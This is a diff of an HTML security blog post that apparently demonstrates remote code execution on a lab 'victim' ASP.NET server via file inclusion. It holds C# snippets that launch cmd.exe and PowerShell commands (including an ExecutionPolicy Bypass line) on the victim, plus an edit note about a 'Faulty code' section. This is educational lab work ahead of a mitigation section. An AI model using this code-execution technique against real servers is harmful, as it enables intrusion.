@@ -40,7 +40,7 @@
 <link href="/blog/css/clean-blog.min.css" rel="stylesheet">
 <script src="/blog/js/clean-blog.min.js"></script>
 
-<link href="/blog/css/buttons.css" rel="stylesheet">
+<link href="/blog/css/svganimations.css" rel="stylesheet">
 
 <script src="/blog/js/sidebar.js"></script>
 <link href="/blog/css/sidebar.css" rel="stylesheet">
@@ -218,6 +218,7 @@ style="background-image:url('/blog/assets/img/home-matrix.png')"
 </li>
 </ul>
 </li>
+<li class="toc-entry toc-h3"><a href="#faulty-code-2">Faulty code</a></li>
 </ul>
 </li>
 </ul>
@@ -3131,7 +3132,7 @@ mv ../packer-windows/windows_2016_docker_virtualbox.box .
 vagrant provision
 </code></pre>
 
-<p>To start the vagrant environment execute</p>
+<p>To start the vagrant environment execute in the windows-docker-machine folder</p>
 
 <pre><code class="bash">vagrant up --provider virtualbox 2016
 </code></pre>
@@ -3275,6 +3276,10 @@ Arguments = "/c dir",
 <pre><code class="DOS.bat">cmd.exe /c dir
 </code></pre>
 
+<p>Result:</p>
+
+<p><img src="/blog/assets/img/payload-tester/lfirfi/asp_victim_rce_dir.png" alt="ASP Victim RCE dir" width="100%"></p>
+
 <p>If you have a Linux Server running dotnet you can change this code for example to the Linux equivalent:</p>
 
 <pre><code class="bash">ls
@@ -3317,8 +3322,7 @@ Arguments = "/c dir",
 
 <p>We use the command:</p>
 
-<pre><code class="DOS.bat">powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "(get-host).version | format-list -property *"
-</code></pre>
+<pre><code class="DOS.bat">powershell get-host</code></pre>
 
 <p>So the code will be:</p>
 
@@ -3332,8 +3336,8 @@ Arguments = "/c dir",
     {
         StartInfo = new System.Diagnostics.ProcessStartInfo
         {
-            FileName = "cmd.exe",
-            Arguments = "/c powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command \"(get-host).version | format-list -property *\"",
+            FileName = "powershell",
+            Arguments = "get-host",
             UseShellExecute = false,
             RedirectStandardOutput = true,
             CreateNoWindow = true
@@ -3357,6 +3361,9 @@ Arguments = "/c dir",
 <p><img src="/blog/assets/img/payload-tester/lfirfi/asp_powershell_check.png" alt="ASP Powershell Check" width="100%"></p>
 
 <p>Splendid! This means we can execute powershell commands on the victim server.</p>
+
+<h3 id="faulty-code-2">
+<a id="faulty-code-2" class="anchor" href="#faulty-code-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Faulty code</h3>
 
 <h1 id="mitigation">
 <a id="mitigation" class="anchor" href="#mitigation" aria-hidden="true"><span class="octicon octicon-link"></span></a>Mitigation</h1>
@@ -3518,7 +3525,7 @@ Arguments = "/c dir",
                         <a href="https://github.com/secf00tprint">
                   <span class="fa-stack fa-lg">
                     <i class="fa fa-circle fa-stack-2x"></i>
-                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                   </span>
                         </a>
                     </li>
@@ -3526,7 +3533,7 @@ Arguments = "/c dir",
                         <a href="https://www.xing.com/profile/Matthias_Altmann9">
                   <span class="fa-stack fa-lg">
                     <i class="fa fa-circle fa-stack-2x"></i>
-                    <i class="fa fa-xing fa-stack-1x fa-inverse"></i>
+                    <i class="fab fa-xing fa-stack-1x fa-inverse"></i>
                   </span>
                         </a>
                     </li>
